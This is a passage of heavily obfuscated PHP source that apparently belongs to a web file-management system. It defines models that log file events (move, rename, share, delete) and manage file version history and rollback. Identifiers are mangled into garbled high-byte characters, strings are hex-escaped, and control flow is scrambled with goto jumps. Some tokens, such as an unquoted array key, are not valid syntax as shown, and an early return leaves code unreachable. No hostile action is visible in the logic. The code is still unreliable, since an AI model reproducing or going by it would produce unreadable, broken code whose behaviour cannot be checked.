(isset($AÇ„È‚¸Â§[$Aè¦Ş”ä‚Á])) { return $AÇ„È‚¸Â§[$Aè¦Ş”ä‚Á]; } $A‚˜…’Ë™Ø = $this->userGroupList($Aè¦Ş”ä‚Á); $bĞ»±¹·¶ö = array(); goto aÖ½×¹àÆ…; aÖ½×¹àÆ…: $aÅÖË®²ø‡ = $GLOBALS[$b“†ƒ´±‹Ô[6]][$b“†ƒ´±‹Ô[94]][$b“†ƒ´±‹Ô[1714]] == 1; $F‡ë”ÜÎˆ = $aÅÖË®²ø‡ ? 3 : 2; foreach ($A‚˜…’Ë™Ø as $D‘ËÁ¬ˆØ) { $E­Öñ÷ÊÃ’ = array($D‘ËÁ¬ˆØ[$b“†ƒ´±‹Ô[1621]]); $F³éÜ±í¼ = explode($b“†ƒ´±‹Ô[57], trim($D‘ËÁ¬ˆØ[$b“†ƒ´±‹Ô[484]], $b“†ƒ´±‹Ô[57])); if ($F³éÜ±í¼[0] == $b“†ƒ´±‹Ô[493] && count($F³éÜ±í¼) > $F‡ë”ÜÎˆ) { $dàÈ…¤‰Üõ = array_slice($F³éÜ±í¼, $F‡ë”ÜÎˆ); $E­Öñ÷ÊÃ’ = array_merge($E­Öñ÷ÊÃ’, array_reverse($dàÈ…¤‰Üõ)); } $bĞ»±¹·¶ö = array_merge($bĞ»±¹·¶ö, $E­Öñ÷ÊÃ’); } goto e¦ä¡ÅÖŠ; e¦ä¡ÅÖŠ: $AÇ„È‚¸Â§[$Aè¦Ş”ä‚Á] = array_unique($bĞ»±¹·¶ö); return $AÇ„È‚¸Â§[$Aè¦Ş”ä‚Á]; goto fì¤šàìŞ›; fì¤šàìŞ›: } public function authTargetInfoMake($B°ÂââØ…§) { goto eàíÒÌêëá; eàíÒÌêëá: $b¯ßá¼òŞ =& $_SERVER[±á õÁ]; $cŸĞâÉ‡ˆ = array(); $F  óÕ‚õ = array(); goto aïŒÛŒ™êÍ; BôšÀÇ·Ãğ: return array($b¯ßá¼òŞ[1824] => $cŸĞâÉ‡ˆ, $b¯ßá¼òŞ[1825] => $F  óÕ‚õ); goto Fù˜¥åè½Ê; aïŒÛŒ™êÍ: foreach ($B°ÂââØ…§ as $Bª•ì¤£±¿) { if ($Bª•ì¤£±¿[$b¯ßá¼òŞ[395]] == SourceModel::TYPE_USER) { $cŸĞâÉ‡ˆ[] = intval($Bª•ì¤£±¿[$b¯ßá¼òŞ[481]]); } else { if ($Bª•ì¤£±¿[$b¯ßá¼òŞ[395]] == SourceModel::TYPE_GROUP) { $F  óÕ‚õ[] = intval($Bª•ì¤£±¿[$b¯ßá¼òŞ[481]]); } } } if ($cŸĞâÉ‡ˆ) { $cŸĞâÉ‡ˆ = Model($b¯ßá¼òŞ[499])->userListInfo($cŸĞâÉ‡ˆ); } if ($F  óÕ‚õ) { $e©¼•©ÚáÖ = array($b¯ßá¼òŞ[1700] => array($b¯ßá¼òŞ[408], $F  óÕ‚õ)); $F  óÕ‚õ = Model($b¯ßá¼òŞ[483])->field($b¯ßá¼òŞ[1713])->where($e©¼•©ÚáÖ)->select(); $F  óÕ‚õ = array_to_keyvalue($F  óÕ‚õ, $b¯ßá¼òŞ[1621]); } goto BôšÀÇ·Ãğ; Fù˜¥åè½Ê: } public function authInfo($B‰ŞØ‹ÇäÕ) { $aÚöŒÆ¿Ê =& $_SERVER[±á õÁ]; if ($B‰ŞØ‹ÇäÕ[$aÚöŒÆ¿Ê[1768]]) { $b³„›ŠÁø¡ = Model($aÚöŒÆ¿Ê[1788])->listData($B‰ŞØ‹ÇäÕ[$aÚöŒÆ¿Ê[1768]]); if (!$b³„›ŠÁø¡) { return !1; $Bä…Àô™Ï¢ = Model($aÚöŒÆ¿Ê[1788])->listData(); $bøÌë¾ÉòÔ = array_filter_by_field($Bä…Àô™Ï¢, $aÚöŒÆ¿Ê[400], $aÚöŒÆ¿Ê[493]); return $bøÌë¾ÉòÔ; } $a”Šô ˆ¯ = array_field_key($b³„›ŠÁø¡, array($aÚöŒÆ¿Ê[391], $aÚöŒÆ¿Ê[38], $aÚöŒÆ¿Ê[400], $aÚöŒÆ¿Ê[1642], $aÚöŒÆ¿Ê[1644])); $a”Šô ˆ¯[$aÚöŒÆ¿Ê[1826]] = $B‰ŞØ‹ÇäÕ; return $a”Šô ˆ¯; } else { return array($aÚöŒÆ¿Ê[409] => 0, $aÚöŒÆ¿Ê[1627] => $B‰ŞØ‹ÇäÕ[$aÚöŒÆ¿Ê[1769]], $aÚöŒÆ¿Ê[410] => $aÚöŒÆ¿Ê[43], $aÚöŒÆ¿Ê[1642] => $aÚöŒÆ¿Ê[1827]); } } } goto F–¾ÍÂæ‚Õ; F–¾ÍÂæ‚Õ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\143\x65\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\155\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\156\x63\x74\151\157\156"), array("\x64\x65\x73\x63", '', "\x69\x6e\x73\x65\x72\x74\x2c\x75\160\144\x61\164\x65\54\163\145\154\x65\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Bˆ°‚ä©îõ, $cÀš¹Ã¡‡¹, $c†ìÚ–èÉÇ = '') { goto Aš‡ò¢°Õ; CÚÜÀ´Ïå: if (!$fâˆÆÈÂé) { return !1; } if ($this->isCacheEvent($fâˆÆÈÂé, $cÀš¹Ã¡‡¹)) { return; } if ($c†ìÚ–èÉÇ && is_string($c†ìÚ–èÉÇ)) { $c†ìÚ–èÉÇ = array($b¬Šì¹Ôãò[1653] => $c†ìÚ–èÉÇ); } goto E¸•’ì†šå; E¸•’ì†šå: $bæ™“ªç = array($b¬Šì¹Ôãò[407] => $Bˆ°‚ä©îõ, $b¬Šì¹Ôãò[1828] => $fâˆÆÈÂé[$b¬Šì¹Ôãò[486]], $b¬Šì¹Ôãò[1829] => $fâˆÆÈÂé[$b¬Šì¹Ôãò[38]], $b¬Šì¹Ôãò[491] => $fâˆÆÈÂé[$b¬Šì¹Ôãò[491]], $b¬Šì¹Ôãò[1455] => USER_ID, $b¬Šì¹Ôãò[412] => $cÀš¹Ã¡‡¹, $b¬Šì¹Ôãò[1457] => $c†ìÚ–èÉÇ); $this->addSystemLog($cÀš¹Ã¡‡¹, $bæ™“ªç); return $this->add($bæ™“ªç); goto CØ¢šÒÄø’; Aš‡ò¢°Õ: $b¬Šì¹Ôãò =& $_SERVER[±á õÁ]; if (!$this->eventSave) { return; } $fâˆÆÈÂé = Model($b¬Šì¹Ôãò[1138])->sourceInfo($Bˆ°‚ä©îõ); goto CÚÜÀ´Ïå; CØ¢šÒÄø’: } private function addSystemLog($aƒÆŒÒ³ˆ, $dŠæ¸ŒË¹„) { $a­”Îäìóó =& $_SERVER[±á õÁ]; if ($aƒÆŒÒ³ˆ == $a­”Îäìóó[1830]) { $aƒÆŒÒ³ˆ = $dŠæ¸ŒË¹„[$a­”Îäìóó[429]][$a­”Îäìóó[1831]]; } else { if (in_array($aƒÆŒÒ³ˆ, array($a­”Îäìóó[1598], $a­”Îäìóó[1832]))) { $aƒÆŒÒ³ˆ = $dŠæ¸ŒË¹„[$a­”Îäìóó[429]][$a­”Îäìóó[717]]; } } $CÅ…®ëã»ê = array_merge($dŠæ¸ŒË¹„, array($a­”Îäìóó[1833] => $dŠæ¸ŒË¹„[$a­”Îäìóó[393]], $a­”Îäìóó[1834] => $dŠæ¸ŒË¹„[$a­”Îäìóó[1834]])); Model($a­”Îäìóó[1561])->addLog($a­”Îäìóó[1835] . $aƒÆŒÒ³ˆ, $CÅ…®ëã»ê); } private function isCacheEvent($fÁ¹º×‚ÇÅ, $Aëƒ£„ã¨·) { if ($fÁ¹º×‚ÇÅ[$_SERVER[±á õÁ][395]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($côæÈ¨ó¤’, $B™‘÷¶îæà) { $BŒŒ§ÖÊ£ =& $_SERVER[±á õÁ]; $DÏäÆšÜ‰¤ = Model($BŒŒ§ÖÊ£[1138])->sourceInfo($côæÈ¨ó¤’); $F®«ã—¸éŒ = array($BŒŒ§ÖÊ£[1831] => $B™‘÷¶îæà, $BŒŒ§ÖÊ£[38] => $DÏäÆšÜ‰¤[$BŒŒ§ÖÊ£[38]]); return $this->addEvent($côæÈ¨ó¤’, $BŒŒ§ÖÊ£[1830], $F®«ã—¸éŒ); } public function eventFileEdit($BØø¸Á‡“’) { $e¼£îÍî« =& $_SERVER[±á õÁ]; $AÓÁ‰‡£¦ğ = array($e¼£îÍî«[1836] => $_SERVER[$e¼£îÍî«[1837]], $e¼£îÍî«[1838] => strtolower(ACTION)); return $this->addEvent($BØø¸Á‡“’, $e¼£îÍî«[1588], $AÓÁ‰‡£¦ğ); } public function eventRecycle($e¤á‡öİ, $CÊ‘Û¯ƒó) { return $this->addEvent($e¤á‡öİ, $_SERVER[±á õÁ][1832], $CÊ‘Û¯ƒó); } public function eventRemove($dÜÆĞ‘åí) { $Däà’Ÿ¥Ğ÷ =& $_SERVER[±á õÁ]; $Fëªº„‰Òœ = Model($Däà’Ÿ¥Ğ÷[1138])->sourceInfo($dÜÆĞ‘åí); $fÛà¼©Ï÷ç = $Fëªº„‰Òœ[$Däà’Ÿ¥Ğ÷[38]]; return $this->addEvent($Fëªº„‰Òœ[$Däà’Ÿ¥Ğ÷[486]], $Däà’Ÿ¥Ğ÷[1587], $fÛà¼©Ï÷ç); } public function eventShare($F³Ş…æâŞ‚, $CÛÙİ­‰¤·) { return $this->addEvent($F³Ş…æâŞ‚, $_SERVER[±á õÁ][1598], $CÛÙİ­‰¤·); } public function eventMove($BÙèòíÁÅÁ, $CïŸ ‘“ÀÇ, $eª÷Œ¡‡İõ) { goto Cê‚ÈÃ»ù´; cĞ½°¼©›: $B‡Ê¸Ü½ä = $e‘‰Â„´->sourceInfo($CïŸ ‘“ÀÇ); $bŒÆ¥Ÿô = $e‘‰Â„´->sourceInfo($eª÷Œ¡‡İõ); $e“æ÷…Ã”Ì = array($bƒÅÄ„”ì[1025] => $CïŸ ‘“ÀÇ, $bƒÅÄ„”ì[1839] => $B‡Ê¸Ü½ä[$bƒÅÄ„”ì[38]], $bƒÅÄ„”ì[1840] => $B‡Ê¸Ü½ä[$bƒÅÄ„”ì[491]], $bƒÅÄ„”ì[1026] => $eª÷Œ¡‡İõ, $bƒÅÄ„”ì[1841] => $bŒÆ¥Ÿô[$bƒÅÄ„”ì[38]], $bƒÅÄ„”ì[1842] => $bŒÆ¥Ÿô[$bƒÅÄ„”ì[491]]); goto f°…­º®É; f°…­º®É: $this->addEvent($BÙèòíÁÅÁ, $bƒÅÄ„”ì[517], $e“æ÷…Ã”Ì); $Dàä¦Æ² = $e‘‰Â„´->sourceInfo($BÙèòíÁÅÁ); $e“æ÷…Ã”Ì = array($bƒÅÄ„”ì[393] => $Dàä¦Æ²[$bƒÅÄ„”ì[393]], $bƒÅÄ„”ì[38] => $Dàä¦Æ²[$bƒÅÄ„”ì[38]]); goto c©¼ºñééÆ; Cê‚ÈÃ»ù´: $bƒÅÄ„”ì =& $_SERVER[±á õÁ]; $e‘‰Â„´ = Model($bƒÅÄ„”ì[1138]); $Dàä¦Æ² = $e‘‰Â„´->sourceInfo($BÙèòíÁÅÁ); goto cĞ½°¼©›; c©¼ºñééÆ: $this->addEvent($CïŸ ‘“ÀÇ, $bƒÅÄ„”ì[1843], $e“æ÷…Ã”Ì); goto cÅ„ŠÀÓ…²; cÅ„ŠÀÓ…²: } public function eventCopy($AÖõã¹ó„õ) { $this->eventCreate($AÖõã¹ó„õ, $_SERVER[±á õÁ][515]); } public function eventRename($F‹ƒ¼ïŒ¥„, $f´Ç¶¨Ô†İ, $C©‚øø‚—ó) { $E´§’˜êó· =& $_SERVER[±á õÁ]; $BÜ²ÅØóß´ = array($E´§’˜êó·[1025] => $f´Ç¶¨Ô†İ, $E´§’˜êó·[1026] => $C©‚øø‚—ó); return $this->addEvent($F‹ƒ¼ïŒ¥„, $E´§’˜êó·[1151], $BÜ²ÅØóß´); } public function eventAddComment($cÕè˜ù­íÆ, $Eæ”çá‹) { return $this->addEvent($cÕè˜ù­íÆ, $_SERVER[±á õÁ][1844], $Eæ”çá‹); } public function eventAddDesc($Eğ™ «¦¼Ô, $c‹ĞÖ®”°Â) { return $this->addEvent($Eğ™ «¦¼Ô, $_SERVER[±á õÁ][1845], $c‹ĞÖ®”°Â); } public function listBySource($bö…µÃ³Ã™) { goto CÇ… ‚íÍ¦; CÇ… ‚íÍ¦: $Eø¢Ùº–«Ş =& $_SERVER[±á õÁ]; $côÓÌ = Model($Eø¢Ùº–«Ş[1138])->sourceInfo($bö…µÃ³Ã™); $Cºô°ÇœÙÒ = array($Eø¢Ùº–«Ş[407] => $bö…µÃ³Ã™); goto bÁ¼Á­­î¥; EŞ†Ä’‘: return $this->eventListParse($BğÄ†ô’©, $bö…µÃ³Ã™); goto c¶œÌÂ¶½¯; bÁ¼Á­­î¥: if ($côÓÌ[$Eø¢Ùº–«Ş[394]] == $Eø¢Ùº–«Ş[93]) { $C‘’Íµ™ = Model($Eø¢Ùº–«Ş[1138])->listSearchChildren($bö…µÃ³Ã™, 20000); $C‘’Íµ™[] = $bö…µÃ³Ã™ . $Eø¢Ùº–«Ş[18]; $Cºô°ÇœÙÒ = array($Eø¢Ùº–«Ş[393] => array($Eø¢Ùº–«Ş[7], $C‘’Íµ™)); } $BğÄ†ô’© = $this->where($Cºô°ÇœÙÒ)->order($Eø¢Ùº–«Ş[1846])->selectPage(); if ($BğÄ†ô’©[$Eø¢Ùº–«Ş[367]][$Eø¢Ùº–«Ş[368]] == 0) { $BğÄ†ô’©[$Eø¢Ùº–«Ş[367]][$Eø¢Ùº–«Ş[368]] = 1; $BğÄ†ô’©[$Eø¢Ùº–«Ş[370]] = array(array($Eø¢Ùº–«Ş[407] => $bö…µÃ³Ã™, $Eø¢Ùº–«Ş[1828] => $côÓÌ[$Eø¢Ùº–«Ş[486]], $Eø¢Ùº–«Ş[1455] => $côÓÌ[$Eø¢Ùº–«Ş[402]], $Eø¢Ùº–«Ş[412] => $Eø¢Ùº–«Ş[1847], $Eø¢Ùº–«Ş[413] => $côÓÌ[$Eø¢Ùº–«Ş[200]], $Eø¢Ùº–«Ş[1457] => $Eø¢Ùº–«Ş[43])); } goto EŞ†Ä’‘; c¶œÌÂ¶½¯: } private function eventListParse($b¶”‰‚Äİ, $fâÎ§¥ìŞ») { goto C‚‘àÉèò¼; b‹¶“’—©ø: $câÖÀó·ØÉ = array_to_keyvalue($b³–‹éİàŞ, $eîÕñ¨à±„[43], $eîÕñ¨à±„[1834]); foreach ($b³–‹éİàŞ as $a¿„¢øÔÄ) { $fÌ‰²Å¤‚ = $a¿„¢øÔÄ[$eîÕñ¨à±„[429]]; if ($a¿„¢øÔÄ[$eîÕñ¨à±„[39]] == $eîÕñ¨à±„[517] && isset($fÌ‰²Å¤‚[$eîÕñ¨à±„[1025]])) { $bÍ‹Â”×´[] = $fÌ‰²Å¤‚[$eîÕñ¨à±„[1025]] . $eîÕñ¨à±„[43]; $bÍ‹Â”×´[] = $fÌ‰²Å¤‚[$eîÕñ¨à±„[1026]] . $eîÕñ¨à±„[43]; } if ($a¿„¢øÔÄ[$eîÕñ¨à±„[39]] == $eîÕñ¨à±„[1843] && isset($fÌ‰²Å¤‚[$eîÕñ¨à±„[393]])) { $bÍ‹Â”×´[] = $fÌ‰²Å¤‚[$eîÕñ¨à±„[393]] . $eîÕñ¨à±„[43]; } } $bÍ‹Â”×´ = array_merge($bÍ‹Â”×´, $câÖÀó·ØÉ, array($fâÎ§¥ìŞ» . $eîÕñ¨à±„[43])); goto f«­—Ñ£ƒ”; f«­—Ñ£ƒ”: $bÍ‹Â”×´ = array_unique($bÍ‹Â”×´); $F±‹¨Á± = array_unique(array_to_keyvalue($b³–‹éİàŞ, $eîÕñ¨à±„[43], $eîÕñ¨à±„[1463])); $cÑ¯–ˆ‚ = Model($eîÕñ¨à±„[502])->userListInfo($F±‹¨Á±); goto B°ÍÖß·¨¼; B°ÍÖß·¨¼: $c¢Óæ±×…à = Model($eîÕñ¨à±„[776])->sourceListInfo($bÍ‹Â”×´, !0); foreach ($b³–‹éİàŞ as &$a¿„¢øÔÄ) { if ($a¿„¢øÔÄ[$eîÕñ¨à±„[39]] == $eîÕñ¨à±„[517] && isset($a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[1025]])) { $a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[1025]] = $c¢Óæ±×…à[$a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[1025]]]; $a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[1026]] = $c¢Óæ±×…à[$a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[1026]]]; } if ($a¿„¢øÔÄ[$eîÕñ¨à±„[39]] == $eîÕñ¨à±„[1843] && isset($a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[393]])) { $a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[393]] = $c¢Óæ±×…à[$a¿„¢øÔÄ[$eîÕñ¨à±„[429]][$eîÕñ¨à±„[393]]]; } $a¿„¢øÔÄ[$eîÕñ¨à±„[415]] = $c¢Óæ±×…à[$a¿„¢øÔÄ[$eîÕñ¨à±„[393]]]; $a¿„¢øÔÄ[$eîÕñ¨à±„[1848]] = $c¢Óæ±×…à[$a¿„¢øÔÄ[$eîÕñ¨à±„[1834]]]; if ($a¿„¢øÔÄ[$eîÕñ¨à±„[39]] == $eîÕñ¨à±„[1587]) { $a¿„¢øÔÄ[$eîÕñ¨à±„[1848]] = $a¿„¢øÔÄ[$eîÕñ¨à±„[415]]; $a¿„¢øÔÄ[$eîÕñ¨à±„[1834]] = $a¿„¢øÔÄ[$eîÕñ¨à±„[1848]][$eîÕñ¨à±„[393]]; $a¿„¢øÔÄ[$eîÕñ¨à±„[415]] = !1; $a¿„¢øÔÄ[$eîÕñ¨à±„[393]] = $eîÕñ¨à±„[43]; } $a¿„¢øÔÄ[$eîÕñ¨à±„[1777]] = $cÑ¯–ˆ‚[$a¿„¢øÔÄ[$eîÕñ¨à±„[1463]]]; } unset($a¿„¢øÔÄ); goto AŒïõ‹”µ­; AŒïõ‹”µ­: $b¶”‰‚Äİ[$eîÕñ¨à±„[370]] = $b³–‹éİàŞ; return $b¶”‰‚Äİ; goto C±¿ÆÅ‰öÂ; C‚‘àÉèò¼: $eîÕñ¨à±„ =& $_SERVER[±á õÁ]; $b³–‹éİàŞ = $b¶”‰‚Äİ[$eîÕñ¨à±„[370]]; $bÍ‹Â”×´ = array_to_keyvalue($b³–‹éİàŞ, $eîÕñ¨à±„[43], $eîÕñ¨à±„[393]); goto b‹¶“’—©ø; C±¿ÆÅ‰öÂ: } public function removeBySource($BÃ–í•¾ï‚) { $AƒŒ…±Æ°õ = array($_SERVER[±á õÁ][407] => $BÃ–í•¾ï‚); $this->where($AƒŒ…±Æ°õ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\x63\145\x5f\150\151\x73\x74\x6f\162\x79"; public function addHistory($bÕ¿ƒñìÅ , $BÑâ¨È¯ºÔ = '') { $Aï–£Ùà¸¡ =& $_SERVER[±á õÁ]; $B²É×©š ˆ = array($Aï–£Ùà¸¡[407] => $bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[393]], $Aï–£Ùà¸¡[1455] => isset($bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[403]]) ? $bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[403]] : $bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[402]], $Aï–£Ùà¸¡[444] => $bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[443]], $Aï–£Ùà¸¡[545] => $bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[87]], $Aï–£Ùà¸¡[1849] => $BÑâ¨È¯ºÔ); $c½Õî¿ôŸ… = $GLOBALS[$Aï–£Ùà¸¡[6]][$Aï–£Ùà¸¡[94]][$Aï–£Ùà¸¡[1850]]; if ($c½Õî¿ôŸ… > 1) { $this->historyAutoClear($B²É×©š ˆ[$Aï–£Ùà¸¡[393]]); $this->add($B²É×©š ˆ); } Model($Aï–£Ùà¸¡[1851])->eventFileEdit($bÕ¿ƒñìÅ [$Aï–£Ùà¸¡[393]]); } private function historyAutoClear($AÆ³ìã Úß) { goto B­Äµİˆ‚; bàëÙ‘Îƒˆ: $bŠÆø­µÅİ = array($B„§ÈâíÓ[409] => array($B„§ÈâíÓ[7], $b¢î·ôê¸Ú)); $this->where($bŠÆø­µÅİ)->delete(); Model($B„§ÈâíÓ[446])->remove($c´ğ³µ’øâ); goto Fªèâ¼‹¦; B­Äµİˆ‚: $B„§ÈâíÓ =& $_SERVER[±á õÁ]; $eçäº„ê = Model($B„§ÈâíÓ[1109])->get($B„§ÈâíÓ[1852]); $b¦Ç²…ï¯Û = $GLOBALS[$B„§ÈâíÓ[6]][$B„§ÈâíÓ[94]][$B„§ÈâíÓ[1850]]; goto c’òªÆØ‘; C¤Ãƒ¤«: $c´ğ³µ’øâ = array_to_keyvalue($c”–±›‘åğ, $B„§ÈâíÓ[43], $B„§ÈâíÓ[443]); $c´ğ³µ’øâ = array_slice($c´ğ³µ’øâ, $eÉáäî£×—); if (!$b¢î·ôê¸Ú || !$c´ğ³µ’øâ) { return; } goto bàëÙ‘Îƒˆ; f˜á¢Ã›²ô: if (!$c”–±›‘åğ || $eÉáäî£×— >= count($c”–±›‘åğ)) { return; } $b¢î·ôê¸Ú = array_to_keyvalue($c”–±›‘åğ, $B„§ÈâíÓ[43], $B„§ÈâíÓ[391]); $b¢î·ôê¸Ú = array_slice($b¢î·ôê¸Ú, $eÉáäî£×—); goto C¤Ãƒ¤«; c’òªÆØ‘: $c¾ÜÚ²„ÇŠ = $eçäº„ê == $B„§ÈâíÓ[1853] ? 3 : $b¦Ç²…ï¯Û; if ($b¦Ç²…ï¯Û <= 1) { $c¾ÜÚ²„ÇŠ = 1; } $eÉáäî£×— = $c¾ÜÚ²„ÇŠ - 1; goto Aùâ’¾Îæ; Aùâ’¾Îæ: if ($eÉáäî£×— >= 500) { return; } $bŠÆø­µÅİ = array($B„§ÈâíÓ[407] => $AÆ³ìã Úß); $c”–±›‘åğ = $this->field($B„§ÈâíÓ[1854])->where($bŠÆø­µÅİ)->order($B„§ÈâíÓ[1846])->select(); goto f˜á¢Ã›²ô; Fªèâ¼‹¦: } public function listData($Fêğç‘·Ø‰) { goto AÇ¡°ØŒ›; AÇ¡°ØŒ›: $bÍÓ®èŸ¸• =& $_SERVER[±á õÁ]; $F—ï¨Ø÷™¥ = array($bÍÓ®èŸ¸•[407] => $Fêğç‘·Ø‰); $F”îòñåí = $bÍÓ®èŸ¸•[1855]; goto Cîƒ¡…®Êô; E¯¿ê¹Õ‰ë: $Cƒ¬Šã†Ÿ¯ = 3; if ($d·°ŒîöÖß == $bÍÓ®èŸ¸•[1853]) { $DË—½¨·¨[$bÍÓ®èŸ¸•[370]] = array_slice($DË—½¨·¨[$bÍÓ®èŸ¸•[370]], 0, $Cƒ¬Šã†Ÿ¯); $DË—½¨·¨[$bÍÓ®èŸ¸•[367]] = array($bÍÓ®èŸ¸•[1856] => 1, $bÍÓ®èŸ¸•[1857] => 20, $bÍÓ®èŸ¸•[1858] => 1, $bÍÓ®èŸ¸•[1859] => count($DË—½¨·¨[$bÍÓ®èŸ¸•[370]])); } return $DË—½¨·¨; goto f»…Èï—«°; Cîƒ¡…®Êô: $DË—½¨·¨ = $this->field($F”îòñåí)->where($F—ï¨Ø÷™¥)->order($bÍÓ®èŸ¸•[1846])->selectPage(); $this->_listAppendUser($DË—½¨·¨[$bÍÓ®èŸ¸•[370]]); $d·°ŒîöÖß = Model($bÍÓ®èŸ¸•[1109])->get($bÍÓ®èŸ¸•[1852]); goto E¯¿ê¹Õ‰ë; f»…Èï—«°: } protected function _listAppendUser(&$bƒõƒÔ˜ô²) { $a“Ä¾—‹Äí =& $_SERVER[±á õÁ]; $F•İÆÊÑ• = array_to_keyvalue($bƒõƒÔ˜ô², $a“Ä¾—‹Äí[43], $a“Ä¾—‹Äí[1463]); $cÇ™Ó˜Œİë = Model($a“Ä¾—‹Äí[502])->userListInfo($F•İÆÊÑ•); foreach ($bƒõƒÔ˜ô² as &$dŸÖ®…­é”) { $A™àÓøÉ¼ = $dŸÖ®…­é”[$a“Ä¾—‹Äí[1463]]; $dŸÖ®…­é”[$a“Ä¾—‹Äí[402]] = $cÇ™Ó˜Œİë[$A™àÓøÉ¼] ? $cÇ™Ó˜Œİë[$A™àÓøÉ¼] : !1; } unset($dŸÖ®…­é”); } public function fileInfo($c‹–Ñ’Â†Ú) { $EËƒ‚–£¡ =& $_SERVER[±á õÁ]; $DåÊ¥…–¥ = $this->tablePrefix; $eğò¯˜ò«‘ = "{$DåÊ¥…–¥}\x69\157\x5f\146\x69\154\x65\x20\146\151\x6c\145\x73\x20\157\156\40\x66\x69\x6c\x65\x73\x2e\x66\x69\x6c\x65\x49\x44\40\75\x20\150\x69\x73\x74\x6f\x72\x79\x2e\x66\x69\154\145\111\x44"; return $this->alias($EËƒ‚–£¡[1860])->where(array($EËƒ‚–£¡[409] => $c‹–Ñ’Â†Ú))->join($eğò¯˜ò«‘, $EËƒ‚–£¡[1861])->find(); } public function removeItem($F®™Ä‡«) { $A°Û”‰÷˜ =& $_SERVER[±á õÁ]; $a˜·‚öå…Æ = array($A°Û”‰÷˜[409] => $F®™Ä‡«); $e¿Ï›“©ÉÊ = $this->where($a˜·‚öå…Æ)->find(); if ($e¿Ï›“©ÉÊ) { $bËÊ–¨—“Ÿ = $this->where($a˜·‚öå…Æ)->delete(); Model($A°Û”‰÷˜[446])->remove($e¿Ï›“©ÉÊ[$A°Û”‰÷˜[443]]); return $bËÊ–¨—“Ÿ; } return !1; } public function removeBySource($Få­Š£Ÿ³ß) { goto D´ààßè‚ğ; C„”³ùÔƒ½: $B§ª„ÛÈİ³ = array($A¼ÖÄÚöØİ[407] => array($A¼ÖÄÚöØİ[7], $Få­Š£Ÿ³ß)); $FĞ•Ø®’ÔÆ = $this->field($A¼ÖÄÚöØİ[444])->where($B§ª„ÛÈİ³)->select(); if ($FĞ•Ø®’ÔÆ) { $this->where($B§ª„ÛÈİ³)->delete(); $fÂîÌÓ¬µÃ = array_to_keyvalue($FĞ•Ø®’ÔÆ, $A¼ÖÄÚöØİ[43], $A¼ÖÄÚöØİ[443]); Model($A¼ÖÄÚöØİ[446])->remove($fÂîÌÓ¬µÃ); } goto FÎ¿‹«‡°³; FÎ¿‹«‡°³: return !0; goto FïÂÆ‘ˆŸ•; D´ààßè‚ğ: $A¼ÖÄÚöØİ =& $_SERVER[±á õÁ]; if (!$Få­Š£Ÿ³ß) { return !1; } if (!is_array($Få­Š£Ÿ³ß)) { $Få­Š£Ÿ³ß = array($Få­Š£Ÿ³ß); } goto C„”³ùÔƒ½; FïÂÆ‘ˆŸ•: } public function setDetail($EßíÂ¿×®, $bÜ…ø÷ÔÊÂ) { $F“×ÂßôÍÈ =& $_SERVER[±á õÁ]; return $this->where(array($F“×ÂßôÍÈ[409] => $EßíÂ¿×®))->save(array($F“×ÂßôÍÈ[1849] => $bÜ…ø÷ÔÊÂ)); } public function rollbackToItem($c‚“…ÅÊ¦Ë, $B¥ÛÚÒòğ…) { goto fÄÙ¾‚’š§; fÄÙ¾‚’š§: $E™„ÍÆÑÇ =& $_SERVER[±á õÁ]; $Dğƒ‘àˆ = Model($E™„ÍÆÑÇ[776])->sourceInfo($c‚“…ÅÊ¦Ë); $this->addHistory($Dğƒ‘àˆ); goto cÊ¾ïöµƒ˜; cÊ¾ïöµƒ˜: $Eº±Ö˜‹Ú = $this->find($B¥ÛÚÒòğ…); $b”É‡‰‰ = array($E™„ÍÆÑÇ[443] => $Eº±Ö˜‹Ú[$E™„ÍÆÑÇ[443]], $E™„ÍÆÑÇ[87] => $Eº±Ö˜‹Ú[$E™„ÍÆÑÇ[87]], $E™„ÍÆÑÇ[117] => time(), $E™„ÍÆÑÇ[403] => USER_ID); Model($E™„ÍÆÑÇ[776])->where(array($E™„ÍÆÑÇ[393] => $c‚“…ÅÊ¦Ë))->save($b”É‡‰‰); goto FÅî¬°×ß; FÅî¬°×ß: return $this->where(array($E™„ÍÆÑÇ[409] => $B¥ÛÚÒòğ…))->delete(); goto D‘À•å»Å; D‘À•å»Å: } public function clearSame($E¥Õ §„„Ë) { goto dÔ·ñîÜ«Ï; DÇ²ƒÄØ•: $fóìÊ¸¾öğ = array(); $fùŸ„èßé¶ = array(); foreach ($E²í¥âïöŠ as $d†Úß“œ¯õ) { if (!$d†Úß“œ¯õ || count($d†Úß“œ¯õ) <= 1) { continue; } foreach ($d†Úß“œ¯õ as $f¥æ››ìÄ) { $fóìÊ¸¾öğ[] = $f¥æ››ìÄ[$CĞ¶ñÉ«ùÖ[443]]; $fùŸ„èßé¶[] = $f¥æ››ìÄ[$CĞ¶ñÉ«ùÖ[391]]; } } goto Aöøç½™Ã; Aöøç½™Ã: if (!$fùŸ„èßé¶) { return; } $this->where(array($CĞ¶ñÉ«ùÖ[391] => array($CĞ¶ñÉ«ùÖ[7], $fùŸ„èßé¶)))->delete(); 